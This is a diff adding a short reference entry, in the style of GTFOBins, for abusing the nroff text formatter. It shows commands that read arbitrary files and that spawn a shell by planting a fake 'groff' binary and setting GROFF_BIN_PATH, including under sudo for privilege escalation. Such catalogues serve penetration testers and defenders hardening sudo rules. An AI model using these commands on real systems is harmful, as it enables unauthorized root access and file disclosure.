@@ -1,0 +1,26 @@
+nroff
+=====
+
+File read
+---------
+
+[Sudo]
+    nroff /path/to/input-file
+    The file is typeset and some warning messages may appear.
+
+[Unprivileged]
+    nroff /path/to/input-file
+    The file is typeset and some warning messages may appear.
+
+Shell
+-----
+
+[Sudo]
+    echo /bin/sh >groff
+chmod +x groff
+GROFF_BIN_PATH=. nroff
+
+[Unprivileged]
+    echo /bin/sh >groff
+chmod +x groff
+GROFF_BIN_PATH=. nroff
